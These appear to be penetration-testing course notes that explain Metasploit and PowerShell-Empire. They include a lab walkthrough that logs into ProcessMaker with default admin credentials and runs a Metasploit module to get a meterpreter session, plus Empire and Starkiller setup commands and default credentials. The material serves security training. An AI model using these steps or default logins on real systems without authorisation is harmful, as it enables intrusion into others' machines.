# 6 - Exploitation Frameworks

## <mark style="color:red;">The Metasploit Framework (MSF)</mark>

* The Metasploit Framework (MSF) is an open-source, robust penetration testing and exploitation framework that is used by penetration testers and security researchers worldwide.
* It provides penetration testers with a robust infrastructure required to automate every stage of the penetration testing life cycle.
* It is also used to develop and test exploits and has one of the world's largest database of public, tested exploits.
* The Metasploit Framework is designed to be modular, allowing for new functionality to be implemented with ease.

### **Essential Terminology**

* **Interface** - Methods of interacting with the Metasploit Framework.
* &#x20;**Module** - Pieces of code that perform a particular task, an example of a module is an exploit.
* **Vulnerability** - Weakness or flaw in a computer system or network that can be exploited.
* **Exploit** - Piece of code/module that is used to take advantage of a vulnerability within a system, service or application.
* **Payload** - Piece of code delivered to the target system by an exploit with the objective of executing arbitrary commands or providing remote access to an attacker.
* **Listener** - A utility that listens for an incoming connection from a target.

### **Metasploit Framework Console**

* The Metasploit Framework Console (MSFconsole) is an easy-to-use all in one interface that provides you with access to all of the functionality of the Metasploit Framework.

### **Penetration Testing With MSF**

* The MSF can be used to perform and automate various tasks that fall under the penetration testing life cycle.
* In order to understand how we can leverage the MSF for penetration testing, we need to explore the various phases of a penetration test and their respective techniques and objectives.
* We can adopt the PTES (Penetration Testing Execution Standard) as a roadmap to understanding the various phases that make up a penetration test and how Metasploit can be integrated in to each phase.

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

### Practical Demonstration

{% code overflow="wrap" %}
```bash
# nmap scan, we exploited the http server (process maker)
# we did a google search for the default credentials admin:admin

# click the [Admin] tab, Users tab or Settings tab, System information(get the version)-2.5.0

# we do a search with "searchsploit"
searchsploit ProcessMaker

# create a workspace, search ProcessMaker 
use exploit/multi/http/processmaker_exec
options
set PASSWORD admin
set USERNAME admin
set RHOSTS $ip
run/exploit # we get a meterpreter session.
# get the flag in the C:\ root dir. 
```
{% endcode %}





## <mark style="color:red;">PowerShell-Empire</mark>

* PowerShell-Empire (Aka Empire) is a pure PowerShell exploitation/post-exploitation framework built on cryptological-secure communications and flexible architecture.
* Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from keyloggers to Mimikatz, and adaptable communications to evade network detection, all wrapped up in a usability-focused framework.
* PowerShell Empire recently received an update and is now officially supported and maintained by Kali Linux, more information regarding the update can be found here:
  * [https://kali.org/blog/empire-starkiller/](https://kali.org/blog/empire-starkiller/)

### <mark style="color:orange;">**Starkiller**</mark>

▪ In addition to being updated and modernized, BC Security, the company responsible for maintaining the Empire has also developed a companion to Empire called Starkiller.

▪ Starkiller is a GUI Frontend for the Powershell Empire. It is an Electron application written in VueJS and provides users with an intuitive way of interacting with Empire.

▪ In order to get an understanding of how Empire works and the components that make up the framework, I would recommend going through the official documentation which can be found here: [https://bc-security.gitbook.io/empire-wiki/](https://bc-security.gitbook.io/empire-wiki/)

▪ PowerShell-Empire & Starkiller are both available as packages in the Kali Linux repositories.

### **Practical Demonstration**

{% code overflow="wrap" %}
```bash
sudo apt-get install powershell-empire starkiller #Install PowerShell-Empire and Starkiller.
sudo powershell-empire server # Start the PowerShell-Empire server
sudo powershell-empire client # Start the PowerShell-Empire client, server must be running in order to use the client.

Empire > listeners #Show every active listener
Empire > agents #Show every exploited agents (hosts) you currently have access to

# starkiller is a frontend for powershell empire.
#Default Starkiller credentials empireadmin:password123
```
{% endcode %}



